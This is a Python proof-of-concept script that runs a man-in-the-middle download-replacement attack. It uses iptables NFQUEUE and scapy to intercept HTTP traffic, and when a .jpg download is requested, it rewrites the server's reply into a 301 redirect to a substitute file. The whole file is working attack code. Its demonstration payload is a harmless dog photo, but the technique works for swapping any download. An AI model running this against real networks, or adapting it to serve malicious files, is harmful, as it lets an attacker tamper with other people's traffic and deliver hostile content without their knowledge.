#!/usr/bin/env python3
"""
    rdf: Replace downloaded files with custom payload. Must be man-in-the-middle for
         this to work. Does not work very well, but is still a nice PoC.
    Author: Yusef Karim

    * If you want to setup a queue on your machine locally, run:
        iptables -I INPUT -j NFQUEUE --queue-num 1
        iptables -I OUTPUT -j NFQUEUE --queue-num 1
    * Example HTTP site for testing:
        http://www.bigfoto.com/
"""
from os import getuid
from sys import exit
import argparse
from subprocess import call
from signal import signal, SIGINT
from scapy.packet import Raw
from scapy.layers.inet import IP, UDP, TCP
from scapy.compat import raw
import netfilterqueue

FILE_EXT = b".jpg"
CUSTOM_LOAD = (b"HTTP/1.1 301 Moved Permanently\r\n"
    b"Location: http://www.pets4homes.co.uk/images/articles/"
    b"1695/large/the-pros-and-cons-of-keeping-a-rottweiler-as-a-pet-5389cba92bfaf.jpg\n\n")
LOAD_KEYWORD = b"rottweiler"
ACK_LIST = []

def enable_iptable_queue():
    ret_val = call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '1'])
    if(ret_val != 0):
        print("[-] Enabling iptables queue failed. Try again or do it manually")
        exit(1)

    print("[+] Successfully enabled iptables queue rule")


def set_load(pkt, load):
    pkt[Raw].load = load
    del pkt[IP].len
    del pkt[IP].chksum
    del pkt[TCP].chksum
    return pkt


def process_packet(pkt):
    global ACK_LIST
    scapy_pkt = IP(pkt.get_payload())
    if(scapy_pkt.haslayer(TCP)):
        tcp = scapy_pkt.getlayer(TCP)
        raw_layer = scapy_pkt.getlayer(Raw).load if scapy_pkt.haslayer(Raw) else None
        # If destination port is port 80, most likely a HTTP request, else HTTP response
        if(tcp.dport == 80 and raw_layer):
            if(FILE_EXT in raw_layer and LOAD_KEYWORD not in raw_layer):
                ACK_LIST.append(tcp.ack)
        elif(tcp.sport == 80 and (tcp.seq in ACK_LIST) and raw_layer):
            ACK_LIST.remove(tcp.seq)
            scapy_pkt = set_load(scapy_pkt, CUSTOM_LOAD)
            # Use the class instance to recalculate the chksum and len fields for us
            # Accepts a packet in bytes format, then casted back into bytes for payload
            scapy_pkt = raw(scapy_pkt.__class__(raw(scapy_pkt)))
            # Update the current packets payload with the payload of our spoofed one
            pkt.set_payload(scapy_pkt)

    pkt.accept()


def cleanup_and_exit(signum, frame):
    ret_val = call(['iptables', '-F', 'FORWARD'])
    if(ret_val != 0):
        print("[-] Disabling iptables queue failed. Run 'iptables -F FORWARD' manually")
        exit(1)

    print("[+] Successfully disabled iptables queue rule\n[+] Goodbye!")
    exit(0)


if __name__ == "__main__":
    signal(SIGINT, cleanup_and_exit)
    if(getuid() != 0):
        print("[-] This program must be run as root")
        exit(1)
    else:
        print("[+] Starting file replacer, press ctrl-c to quit")
        # Enable iptables queue then run the netfilter queue with specified callback
        enable_iptable_queue()
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(1, process_packet)
        queue.run()

